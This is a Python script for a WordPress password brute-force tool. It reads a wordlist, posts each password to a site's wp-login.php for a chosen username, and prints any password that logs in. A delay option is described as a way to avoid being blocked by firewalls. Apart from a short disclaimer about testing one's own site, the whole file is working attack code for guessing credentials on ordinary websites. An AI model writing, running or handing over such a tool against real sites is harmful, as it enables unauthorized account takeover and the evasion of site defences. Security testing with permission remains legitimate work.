import requests
import sys
import argparse
import time

# --- IMPORTANT INFORMATION ---
# This script is designed for educational purposes and for security testing on your own systems.
# Using this tool for unauthorized access to any system is illegal and unethical
# and can lead to severe legal consequences. The responsibility for using this tool rests with the user.
# Always obtain written permission before performing any security tests on other websites.

def print_banner():
    """Prints a welcome banner."""
    banner = """
 █░█░█ █▀█ █▀█ █▀▄ █░░ █ █▀ ▀█▀   █▀▀ █▀▀ █▄░█ █▀▀ █▀█ ▄▀█ ▀█▀ █▀█ █▀█
▀▄▀▄▀ █▄█ █▀▄ █▄▀ █▄▄ █ ▄█ ░█░   █▄█ ██▄ █░▀█ ██▄ █▀▄ █▀█ ░█░ █▄█ █▀▄
---------------------------------------------------
       WordPress Bruteforce v1.0
       For testing the security of your own website
---------------------------------------------------
    """
    print(banner)

def test_password(login_url, username, password):
    """
    Attempts to log in with a specified username and password.
    Returns True on success, False otherwise.
    """
    payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': login_url.replace('wp-login.php', 'wp-admin/'),
        'testcookie': 1
    }
    
    try:
        # Send POST request
        response = requests.post(login_url, data=payload, allow_redirects=False, timeout=10)
        
        # Check server response
        # If login is successful, it usually redirects to wp-admin or the dashboard (status code 302).
        # We can also look for specific texts in the response that indicate a successful login.
        
        # Status code 302 indicates a redirect, which usually happens after a successful login.
        if response.status_code == 302 and 'Location' in response.headers and 'wp-admin' in response.headers['Location']:
            return True
        
        # If the login page is shown again or there's a login error message
        if "Incorrect username or password" not in response.text and "Error" not in response.text:
            # This is a heuristic and might not be accurate in all cases.
            # The best approach is to carefully analyze the server's response behavior after a successful login.
            # For example, if redirected to a page containing 'wp-admin'.
            # Or if you see text like "You are now logged in" or similar.
            pass # Continue checking
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Network error during login attempt: {e}")
    return False

def brute_force_wordpress(login_url, username, wordlist_file, delay=0):
    """
    Executes a Brute-force attack on a WordPress login page.
    """
    found_password = None
    
    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
            
        print(f"[+] Starting Brute-force test for username '{username}' on {login_url}")
        print(f"[+] Number of passwords in wordlist: {len(passwords)}")
        
        for i, password in enumerate(passwords):
            print(f"[*] Attempt ({i+1}/{len(passwords)}): Username='{username}', Password='{password}'", end='\r')
            if test_password(login_url, username, password):
                found_password = password
                break
            
            if delay > 0:
                time.sleep(delay) # To prevent blocking by firewall or security system
                
    except FileNotFoundError:
        print(f"[-] Wordlist file '{wordlist_file}' not found.")
        return None
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return None
        
    print("\n" + "-"*50)
    if found_password:
        print(f"[!!!] Password found: Username='{username}', Password='{found_password}'")
    else:
        print(f"[-] Password for username '{username}' not found in the wordlist.")
    print("-"*50)
    
    return found_password

if __name__ == "__main__":
    print_banner()
    
    parser = argparse.ArgumentParser(description="WordPress Brute-force Password Tester tool.")
    parser.add_argument("url", help="Full URL of the WordPress login page (e.g., http://example.com/wp-login.php)")
    parser.add_argument("-u", "--username", required=True, help="Target username for testing")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file (wordlist.txt)")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay (in seconds) between each attempt (to prevent blocking)")

    args = parser.parse_args()

    # Check URL format
    if not args.url.endswith('/wp-login.php'):
        print("[!] Warning: The URL might not be correct. It should end with /wp-login.php.")
        confirm = input("Do you want to continue? (y/n): ").lower()
        if confirm != 'y':
            sys.exit(1)

    brute_force_wordpress(args.url, args.username, args.wordlist, args.delay)

